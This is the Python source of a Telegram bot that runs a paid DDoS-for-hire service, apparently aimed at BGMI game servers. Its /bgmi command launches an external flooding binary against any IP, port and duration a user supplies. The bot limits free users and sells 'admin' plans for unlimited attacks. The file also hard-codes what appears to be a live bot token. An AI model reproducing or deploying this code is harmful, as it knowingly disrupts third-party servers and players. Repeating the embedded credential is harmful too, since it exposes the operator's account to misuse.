import subprocess
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from datetime import datetime, timedelta
from apscheduler.schedulers.background import BackgroundScheduler
from functools import partial

# Bot token and channel IDs
BOT_TOKEN = "7773477885:AAEHhes4_dMka2T50CCajdXONlt3XNmHyos"
CHANNEL_ID = ["-1002247039181", "-1002204468342"]
OWNER_ID = {6939572417}  # Replace with your owner IDs

# Constants
INVALID_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001, 8080, 8086, 8011, 9030}
MAX_TIME = 60
COOLDOWN_TIME = 600

# Global variables
last_attack_time = {}
bgmi_blocked = False
admins_file = "admins.txt"
logs_file = "logs.txt"
blocked_users_file = "blocked_users.txt"
admins = set()
blocked_users = set()
going_attacks = {}
scheduler = BackgroundScheduler()  # Initialize the scheduler
scheduler.start()  # Start the scheduler
daily_bgmi_usage = {}

def reset_daily_usage():
    global daily_bgmi_usage
    daily_bgmi_usage = {}

scheduler.add_job(reset_daily_usage, "cron", hour=0)  # Reset at midnight

# Admin management
def load_admins():
    global admins
    try:
        with open(admins_file, "r") as f:
            admins = {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        admins = OWNER_ID
        save_admins()

def save_admins():
    with open(admins_file, "w") as f:
        f.writelines(f"{admin_id}\n" for admin_id in admins)

# Blocked users management
def load_blocked_users():
    global blocked_users
    try:
        with open(blocked_users_file, "r") as f:
            blocked_users = {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        blocked_users = set()
        save_blocked_users()

def save_blocked_users():
    with open(blocked_users_file, "w") as f:
        f.writelines(f"{user_id}\n" for user_id in blocked_users)

# Logging
def log_attack(user_id, username, ip, port, time_sec):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(logs_file, "a") as f:
        f.write(f"{timestamp} - UserID: {user_id}, Username: {username}, IP: {ip}, Port: {port}, Time: {time_sec}\n")

# Helper to check channel membership
async def is_user_in_all_channels(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    for channel_id in CHANNEL_ID:
        try:
            member_status = await context.bot.get_chat_member(channel_id, user_id)
            if member_status.status not in ["member", "administrator", "creator"]:
                return False
        except Exception:
            return False
    return True

# Attack completion notification
async def notify_attack_finished(context: ContextTypes.DEFAULT_TYPE, user_id: int, ip: str, port: int):
    await context.bot.send_message(
        chat_id=user_id,
        text=f"\u2705 The attack on \n\U0001F5A5 IP: {ip},\n\U0001F310 Port: {port} has finished."
    )
    going_attacks.pop((user_id, ip, port), None)  # Remove from ongoing attacks

# Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id in blocked_users:
        await update.message.reply_text("\u274C You are blocked from using this bot.")
        return

    if not await is_user_in_all_channels(user_id, context):
        await update.message.reply_text(
            "\u274C Access Denied! Please join the required channels to use this bot.\n"
            "1. [Channel 1](https://t.me/+Edf2t3u9ifEzZmRl)\n"
            "2. [Channel 2](https://t.me/+ft1CukwpYMg5MGRl)\n"
            "\u2022 Max time limit: 60 seconds\n"
            "\u2022 Cooldown time: 600 seconds\n"
            "\u2022 Purchase admin privileges for no restrictions!\n\n"
            "\u2022OWNER - @shantanu24_6 ",
            parse_mode="Markdown",
        )
    else:
        await update.message.reply_text(
            "\u2705 Welcome! Use /bgmi to start.\n"
            "\u2022 Max time limit: 60 seconds\n"
            "\u2022 Cooldown time: 600 seconds\n"
            "\u2022 Purchase admin privileges for no restrictions!\n"
            "\u2022OWNER - @shantanu24_6 "
        )

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bgmi_blocked, last_attack_time, daily_bgmi_usage
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"

    if user_id in blocked_users:
        await update.message.reply_text("\u274C You are blocked from using this command.")
        return

    if bgmi_blocked:
        await update.message.reply_text("\u274C The /bgmi command is currently blocked.")
        return

    if not await is_user_in_all_channels(user_id, context):
        await update.message.reply_text(
            "\u274C Please join all required channels to use this command:\n"
            "1. [Channel 1](https://t.me/+Edf2t3u9ifEzZmRl)\n"
            "2. [Channel 2](https://t.me/+ft1CukwpYMg5MGRl)",
            parse_mode="Markdown",
        )
        return

    # Daily usage limit for free users
    if user_id not in admins and user_id not in OWNER_ID:
        daily_usage = daily_bgmi_usage.get(user_id, 0)
        if daily_usage >= 5:
            await update.message.reply_text(
                "\u274C You have reached your daily limit of 5 uses.\n"
                "Purchase admin privileges for unlimited usage."
            )
            return
        daily_bgmi_usage[user_id] = daily_usage + 1

    now = datetime.now()
    last_time = last_attack_time.get(user_id, None)
    if user_id not in admins and user_id not in OWNER_ID:
        if last_time and (now - last_time).total_seconds() < COOLDOWN_TIME:
            remaining = COOLDOWN_TIME - (now - last_time).total_seconds()
            await update.message.reply_text(f"\u23F3 Please wait {int(remaining)} seconds before using this command again.\n\u2022TO REMOVE COOLDOWN TIME PURCHASE ADMIN PLAN BY \u2022OWNER - @shantanu24_6 ")
            return

    if len(context.args) != 3:
        await update.message.reply_text(
            "\u26A0 Usage: /bgmi <ip> <port> <time>\n\n"
            "\u2022 Max time limit: 60 seconds\n"
            "\u2022 Cooldown time: 600 seconds\n"
            "\u2022 Purchase admin privileges for no restrictions!"
            "\u2022OWNER - @shantanu24_6 "
        )
        return

    ip, port, time_str = context.args
    try:
        port = int(port)
        time_sec = int(time_str)
    except ValueError:
        await update.message.reply_text("\u26A0 Invalid input. Port and time must be numeric.")
        return

    if port in INVALID_PORTS:
        await update.message.reply_text("\u26A0 This port is not allowed.")
        return

    if user_id not in admins and time_sec > MAX_TIME:
        await update.message.reply_text("\u26A0 Non-admins are limited to 60 seconds.")
        return

    try:
        subprocess.Popen(["./shan", ip, str(port), str(time_sec)])
        going_attacks[(user_id, ip, port)] = {
            "username": username,
            "time": time_sec,
            "start_time": datetime.now(),
        }

        log_attack(user_id, username, ip, port, time_sec)
        last_attack_time[user_id] = now

        scheduler.add_job(
            partial(notify_attack_finished, context),
            "date",
            run_date=now + timedelta(seconds=time_sec),
            args=[user_id, ip, port],
        )
        await update.message.reply_text(f"\u2705 Attack started:\n\U0001F5A5 IP: {ip}\n\U0001F310 Port: {port}\n\u23F3 Time: {time_sec} seconds\n\n\u2022OWNER - @shantanu24_6 ")    
    except Exception as e:
        await update.message.reply_text(f"\u274C Failed to start attack: {e}")

async def ongoingattacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in admins:
        await update.message.reply_text("\u274C Only admins can view ongoing attacks.")
        return

    if not going_attacks:
        await update.message.reply_text("\u2139 No ongoing attacks.")
        return

    message = "\u2022 Ongoing Attacks:\n"
    for (uid, ip, port), details in going_attacks.items():
        elapsed = (datetime.now() - details["start_time"]).total_seconds()
        remaining = details["time"] - elapsed
        message += (
            f"\u2022 User: {details['username']} (ID: {uid})\n"
            f"\u2022 IP: {ip}, Port: {port}\n"
            f"\u23F3 Time: {details['time']} sec, Remaining: {int(remaining)} sec\n\n"
        )

    await update.message.reply_text(message)

async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in admins:
        await update.message.reply_text("\u274C Only admins can view logs.")
        return

    try:
        with open(logs_file, "r") as f:
            await update.message.reply_document(f)
    except FileNotFoundError:
        await update.message.reply_text("\u2139 No logs available.")

async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in OWNER_ID:
        await update.message.reply_text("\u274C Only the owner can add admins.")
        return

    if len(context.args) != 2:
        await update.message.reply_text("\u26A0 Usage: /addadmin <user_id> <no_of_days>")
        return

    try:
        new_admin_id = int(context.args[0])
        days = int(context.args[1])
    except ValueError:
        await update.message.reply_text("\u26A0 Invalid input. Use integers for user ID and number of days.")
        return

    admins.add(new_admin_id)
    save_admins()

    # Schedule admin removal after the specified number of days
    scheduler.add_job(
        partial(remove_admin_job, new_admin_id),
        "date",
        run_date=datetime.now() + timedelta(days=days)
    )

    await update.message.reply_text(f"\u2705 User {new_admin_id} added as admin for {days} days.")

# Helper function to remove admin privileges
def remove_admin_job(admin_id):
    admins.discard(admin_id)
    save_admins()
    
async def removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in OWNER_ID:
        await update.message.reply_text("\u274C Only the owner can remove admins.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("\u26A0 Usage: /removeadmin <user_id>")
        return

    admin_id = int(context.args[0])
    admins.discard(admin_id)
    save_admins()
    await update.message.reply_text(f"\u2705 User {admin_id} removed from admin list.")

async def blockbgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bgmi_blocked
    bgmi_blocked = True
    await update.message.reply_text("\u274C The /bgmi command has been blocked.")

async def unblockbgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bgmi_blocked
    bgmi_blocked = False
    await update.message.reply_text("\u2705 The /bgmi command has been unblocked.")

async def showadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in OWNER_ID:
        await update.message.reply_text("\u274C Only the owner can view the admin list.")
        return

    if not admins:
        await update.message.reply_text("\u2139 No admins available.")
        return

    message = "\u2022 Admins:\n" + "\n".join(str(admin_id) for admin_id in admins)
    await update.message.reply_text(message)

async def blockuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in OWNER_ID:
        await update.message.reply_text("\u274C Only the owner can block users.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("\u26A0 Usage: /blockuser <user_id>")
        return

    user_to_block = int(context.args[0])
    blocked_users.add(user_to_block)
    save_blocked_users()
    await update.message.reply_text(f"\u274C User {user_to_block} has been blocked.")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in OWNER_ID:
        await update.message.reply_text("\u274C Only the owner can broadcast messages.")
        return

    if not context.args:
        await update.message.reply_text("\u26A0 Usage: /broadcast <message>")
        return

    message = " ".join(context.args)

    for admin_id in admins.union(OWNER_ID):
        try:
            await context.bot.send_message(chat_id=admin_id, text=message)
        except Exception as e:
            print(f"Failed to send message to {admin_id}: {e}")

    await update.message.reply_text("\u2705 Broadcast message sent.")

# Main function
def main():
    load_admins()
    load_blocked_users()
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("ongoingattacks", ongoingattacks))
    app.add_handler(CommandHandler("logs", logs))
    app.add_handler(CommandHandler("addadmin", addadmin))
    app.add_handler(CommandHandler("removeadmin", removeadmin))
    app.add_handler(CommandHandler("blockbgmi", blockbgmi))
    app.add_handler(CommandHandler("unblockbgmi", unblockbgmi))
    app.add_handler(CommandHandler("showadmin", showadmin))
    app.add_handler(CommandHandler("blockuser", blockuser))
    app.add_handler(CommandHandler("broadcast", broadcast))

    app.run_polling()

if __name__ == "__main__":
    main() 

